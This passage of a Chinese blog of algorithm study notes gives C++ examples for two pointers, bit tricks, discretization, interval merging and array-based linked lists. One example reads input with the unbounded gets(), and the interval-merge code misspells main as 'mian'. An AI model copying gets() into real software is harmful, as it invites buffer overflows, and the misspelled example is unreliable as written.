class="number">100</span>];</span><br><span class="line">    <span class="built_in">gets</span>(str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">strlen</span>(str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> j = i;</span><br><span class="line">        <span class="keyword">while</span> (j &lt; n &amp;&amp; str[j] != <span class="string">&#x27; &#x27;</span>) j ++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//问题的具体逻辑</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = i; k &lt; j; k ++) cout &lt;&lt; str[k];</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        i = j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例2： 799</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> a[N], s[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++) cin &gt;&gt; a[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[a[i]] ++;             <span class="comment">//记录每个数出现多少次</span></span><br><span class="line">        <span class="keyword">while</span> (s[a[i]] &gt; <span class="number">1</span>)     <span class="comment">//多于1，让一个数出去</span></span><br><span class="line">        &#123;</span><br><span class="line">            s[a[j]] --;     </span><br><span class="line">            j ++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = <span class="built_in">max</span>(res, i - j + <span class="number">1</span>);  <span class="comment">//返回最大值</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="7、位运算"><a href="#7、位运算" class="headerlink" title="7、位运算"></a>7、位运算</h3><p>求n的第k项数字：n &gt;&gt; k &amp; 1</p><p>​    —— n的二进制表示中第k位是n</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107105953626.png" alt="image-20220107105953626"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">3</span>; k &gt;= <span class="number">0</span>; k --) cout &lt;&lt; (n &gt;&gt; k &amp; <span class="number">1</span>) &lt;&lt; endl;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 返回n的最后一位1： lowbit(n) = n &amp; -n</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107110725078.png" alt="image-20220107110725078"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107112330045.png" alt="image-20220107112330045"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107112527606.png" alt="image-20220107112527606"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; -x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        cin &gt;&gt; x;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x) x -= <span class="built_in">lowbit</span>(x), res ++;   <span class="comment">//每次减去x的最后一位1</span></span><br><span class="line"></span><br><span class="line">        cout &lt;&lt; res &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="8、离散化"><a href="#8、离散化" class="headerlink" title="8、离散化"></a>8、离散化</h3><p>这里特指整数保序的离散化</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220108220342054.png" alt="image-20220108220342054"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220108192729747.png" alt="image-20220108192729747"></p><p>问题</p><p>​    —— a[n]中有相同元素（<font color="red"><strong>去重</strong></font>）</p><p>​    —— 如何算出a[i]离散化后的值  – 二分</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220108193017676.png" alt="image-20220108193017676"></p><p> 排完序后，下标就是其映射值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; PII;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">300010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">int</span> a[N], s[N];         <span class="comment">//s[]为前缀和</span></span><br><span class="line"></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; alls;       <span class="comment">//存储（所有与插入和查询有关的）坐标</span></span><br><span class="line">vector&lt;PII&gt; add, query;     <span class="comment">//存储插入和询问操作的数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用二分查找x所在的位置，此时是alls(x,l,r)排好序的,返回的坐标也会是按照x的大小所给出的；</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, r = alls.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (alls[mid] &gt;= x) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r + <span class="number">1</span>;<span class="comment">//因为后续要使用前缀和，所以返回的坐标要加上1；</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x, c;</span><br><span class="line">        cin &gt;&gt; x &gt;&gt; c;</span><br><span class="line">        add.<span class="built_in">push_back</span>(&#123;x, c&#125;);</span><br><span class="line"></span><br><span class="line">        alls.<span class="built_in">push_back</span>(x);      <span class="comment">//我们要把下标x离散化，先把它加进待离散化的数组里去</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> l, r;</span><br><span class="line">        cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">        query.<span class="built_in">push_back</span>(&#123;l, r&#125;);</span><br><span class="line"></span><br><span class="line">        alls.<span class="built_in">push_back</span>(l);  <span class="comment">//左右端点都需要离散化</span></span><br><span class="line">        alls.<span class="built_in">push_back</span>(r);<span class="comment">//查询的区间肯定要和加入时的点对应，都需要映射到一“空间”</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//去重</span></span><br><span class="line">   <span class="comment">// 将alls进行排序，并将重复的操作删除掉(如进行了两次在x的增值操作，应该去掉一个x保持平衡)；</span></span><br><span class="line">    <span class="built_in">sort</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>());</span><br><span class="line">    alls.<span class="built_in">erase</span>(<span class="built_in">unique</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>()), alls.<span class="built_in">end</span>());</span><br><span class="line">    <span class="comment">//设it是一个迭代器，s.erase(it) 从s中删除迭代器it指向的元素，时间复杂度为O(logn)</span></span><br><span class="line">    <span class="comment">//unique“去除”相邻的重复元素，返回地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//处理插入</span></span><br><span class="line">    <span class="comment">//一个迭代器从1开始直到末尾结束，itdm.first是x，second是r(在上方循环中可知)；</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> item : add)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="built_in">find</span>(item.first);</span><br><span class="line">        a[x] += item.second;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//预处理前缀和</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= alls.<span class="built_in">size</span>(); i ++) s[i] = s[i - <span class="number">1</span>] + a[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//处理询问</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> item : query)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="built_in">find</span>(item.first), r = <span class="built_in">find</span>(item.second);</span><br><span class="line">        <span class="comment">//find函数就是输入映射前的下标，返回在alls中的下标+1。</span></span><br><span class="line">        cout &lt;&lt; s[r] - s[l - <span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="9、区间合并"><a href="#9、区间合并" class="headerlink" title="9、区间合并"></a>9、区间合并</h3><p>有相同部分（包括端点）的多个区间合成一个长的区间</p><p>(1) 按区间左端点排序</p><p>(2) 扫描的过程中把所有可能有交集的区间合并</p><p>三种区间关系</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220108223915885.png" alt="image-20220108223915885"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; PII;     <span class="comment">//存储每个区间的两个端点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">vector&lt;PII&gt; segs;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;PII&gt; &amp;segs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;PII&gt; res;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sort</span>(segs.<span class="built_in">begin</span>(), segs.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> st = <span class="number">-2e9</span>, ed = <span class="number">-2e9</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> seg : segs)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ed &lt; seg.first)         <span class="comment">//没有交集</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (st != <span class="number">-2e9</span>) res.<span class="built_in">push_back</span>(&#123;st, ed&#125;);</span><br><span class="line">            st = seg.first, ed = seg.second;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> ed = <span class="built_in">max</span>(ed, seg.second);</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(st != <span class="number">-2e9</span>) res.<span class="built_in">push_back</span>(&#123;st, ed&#125;);  <span class="comment">//防止空集</span></span><br><span class="line"></span><br><span class="line">    segs = res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mian</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> l, r;</span><br><span class="line">        cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">        segs.<span class="built_in">push_back</span>(&#123;l, r&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">merge</span>(segs);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; segs.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="2、数据结构"><a href="#2、数据结构" class="headerlink" title="2、数据结构"></a>2、数据结构</h2><h3 id="1、链表与邻接表"><a href="#1、链表与邻接表" class="headerlink" title="1、链表与邻接表"></a>1、链表与邻接表</h3><p><strong>数组模拟单链表（邻接表用的最多——存储图和树）和双链表（优化）</strong></p><h4 id="1、单链表"><a href="#1、单链表" class="headerlink" title="1、单链表"></a>1、单链表</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220110150833024.png" alt="image-20220110150833024"></p><p>链表的每一个节点都存储着自己的值和下一个位置的指针</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// head 表示头结点的下标</span></span><br><span class="line"><span class="comment">// e[i] 表示节点i的值</span></span><br><span class="line"><span class="comment">// ne[i] 表示节点i的next指针为多少</span></span><br><span class="line"><span class="comment">// idx 存储当前用到的点</span></span><br><span class="line"><span class="keyword">int</span> head, e[N], ne[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    head = <span class="number">-1</span>;  </span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将元素插入头节点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_to_head</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    ne[idx] = head; <span class="comment">// 把插入元素指向头结点指向的元素</span></span><br><span class="line">    head = idx ++;     <span class="comment">// 将头结点的指针指向插入值,同时idx的值已经使用过了，所以向后移</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将x插入下标为K的点的后面</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    ne[idx] = ne[k];</span><br><span class="line">    ne[k] = idx ++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将下标是k的下一点删掉</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ne[k] = ne[ne[k]];  <span class="comment">// 本来ne[k]指向i，再ne一遍就指向了i+1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    cin &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (m --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k, x;</span><br><span class="line">        <span class="keyword">char</span> op;</span><br><span class="line">        cin &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (op == <span class="string">&#x27;H&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; x;</span><br><span class="line">            <span class="built_in">add_to_head</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; k;</span><br><span class="line">            <span class="keyword">if</span> (!k) head = ne[head];</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">remove</span>(k - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; k &gt;&gt; x;</span><br><span class="line">            <span class="built_in">add</span>(k - <span class="number">1</span>, x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = head; i != <span class="number">-1</span>; i = ne[i]) cout &lt;&lt; e[i] &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="PS-邻接表"><a href="#PS-邻接表" class="headerlink" title="PS: 邻接表"></a>PS: 邻接表</h4><p>把每个点的邻边存下来，是一堆单链表</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220110161945018.png" alt="image-20220110161945018"></p><h4 id="2、双链表"><a href="#2、双链表" class="headerlink" title="2、双链表"></a>2、双链表</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220110160249338.png" alt="image-20220110160249338"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> m;</span><br><span class="line"><span class="keyword">int</span> e[N], l[N], r[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 0表示左端点，1表示右端点</span></span><br><span class="line">    r[<span class="number">0</span>] = 